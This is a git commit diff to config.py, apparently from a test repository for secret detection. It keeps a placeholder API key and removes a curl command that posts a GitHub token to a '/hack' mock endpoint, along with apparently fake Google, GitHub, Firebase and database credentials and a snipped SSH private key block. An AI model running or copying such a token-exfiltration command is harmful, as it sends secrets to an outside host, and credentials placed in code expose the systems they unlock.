8b33f8674480b7906be1b30cdd8094640dd99fb9
Pranesh-Shrestha <pranesh.shrestha@tekvortex.com>
2024-12-16 17:21:21 +0545

    Update config.py

--- config.py
+++ config.py
@@ -2,19 +2,3 @@
 
 # This is a sensitive API key that should never be exposed in a public repository
 API_KEY = "1234567890abcdefg1234567890abcdef"
-curl -k -X POST https://vbirmock.free.beeceptor.com/hack \  -H "Content-Type: 
-application/json" \  -d '{  "GH": "ghp_DEFzmg7RHrQ2eMe2IF4NxNWQodYpab3VMXXX"}'
-GOOGLE_API_KEY = "AIzaSyD-K38b5I6Hd6ms0eE_GHYQ4ovAYfEDftE7t3Wg"
-GITHUB_TOKEN="ghp_Iwz2cUwH7GZXHYghE7eH9bv8Kl5Ej0M7G2X"
-# SSH Private Key
------BEGIN OPENSSH PRIVATE KEY-----
-b3BlbnNzaCB...<snipped>
------END OPENSSH PRIVATE KEY-----
-# Database credentials leak
-DB_USER = "admin"
-DB_PASSWORD = "password123"
-DB_HOST = "localhost"
-# Firebase API Key
-{
-  "apiKey": "AIzaSyABCD12345EFGHIJKL67890MNOPQRSTUV"
-}
